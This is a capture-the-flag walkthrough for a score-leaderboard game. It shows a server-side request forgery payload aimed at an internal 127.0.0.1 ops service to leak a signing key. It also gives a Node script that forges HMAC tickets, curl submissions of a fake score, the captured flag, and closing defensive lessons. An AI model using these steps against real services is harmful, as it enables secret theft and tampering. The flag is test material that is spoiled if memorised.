Walkthrough

Challenge Description

SloppedRider is a charity-themed chart-riding game. The player picks a market chart, rides the generated terrain, lands flips for bonus points, and submits a score to the global leaderboard.

The target score is far above normal gameplay limits:

676,767

Reviewing the client and server logic showed that legitimate scores are capped at approximately 5,000 points, so the intended route was not normal gameplay.

Source Code Review

The application exposes a chart preview feature that accepts a user-controlled URL and fetches it server-side.

app.post("/api/chart/preview", async (req, res) => {
  const feedUrl = String(req.body?.url || "");

  const result = await fetchUrl(feedUrl);
  const json = JSON.parse(result.body);
  ...
});

The helper function selects an HTTP or HTTPS client directly from the provided URL.

function fetchUrl(rawUrl) {
  ...
  const client = parsed.protocol === "https:" ? https : http;
  const req = client.request(parsed, ...);
}

Because there is no destination host filtering, the endpoint is vulnerable to Server-Side Request Forgery.

Internal Service Discovery

Further inspection revealed an internal operations service on a local-only port.

const OPS_PORT = 43219;

function createOpsServer() {
  ...
  if (pathPart === "/ops/config") {
    body = JSON.stringify({
      service: "sloppedrider-ops",
      scoreKey: SCORE_KEY,
      targetScore: TARGET_SCORE
    });
  }
}

The service listens on 127.0.0.1:43219. It is not reachable externally, but the SSRF primitive can request it from the server itself.

Leaking the Score Key

curl -s http://178.105.199.41:8765/api/chart/preview   -H 'Content-Type: application/json'   -d '{"url":"http://127.0.0.1:43219/ops/config"}'

The endpoint rejects the result as an invalid chart, but the error response includes a sample field containing the fetched internal response.

{
  "error": "chart feed must include 8-256 positive prices",
  "sample": "{"service":"sloppedrider-ops","scoreKey":"<LEAKED_KEY>","targetScore":676767,...}"
}

Forging a Ride Ticket

Ride tickets use an HMAC signature over a base64url payload.

payload.signature
signature = HMAC_SHA256(payload, SCORE_KEY)

Once the internal SCORE_KEY is leaked, a valid ticket with an arbitrary score cap can be forged.

const crypto = require("crypto");

const SCORE_KEY = "<LEAKED_KEY>";

const payloadObj = {
  v: 1,
  kind: "preview",
  symbol: "PWN",
  period: "custom",
  cap: 676767,
  iat: Math.floor(Date.now() / 1000)
};

const payload = Buffer
  .from(JSON.stringify(payloadObj))
  .toString("base64url");

const sig = crypto
  .createHmac("sha256", SCORE_KEY)
  .update(payload)
  .digest("base64url");

console.log(payload + "." + sig);

Submitting the Impossible Score

curl -s http://178.105.199.41:8765/api/score   -H 'Content-Type: application/json'   -d '{
    "rideTicket":"<FORGED_TICKET>",
    "score":676767,
    "nick":"pwn"
  }'

The forged ticket is accepted, the score target is met, and the server returns the flag.

{
  "ok": true,
  "rank": 0,
  "flag": "slopped{riding_0n_M3?}"
}

after action report

Lessons Learned

  • Server-side fetch endpoints need strict host allowlists and private-address blocking.
  • Error responses should never echo sensitive internal service content.
  • HMAC signatures are only as strong as the secrecy of the signing key.
  • When gameplay limits make a target impossible, review the trust boundary around score submission.
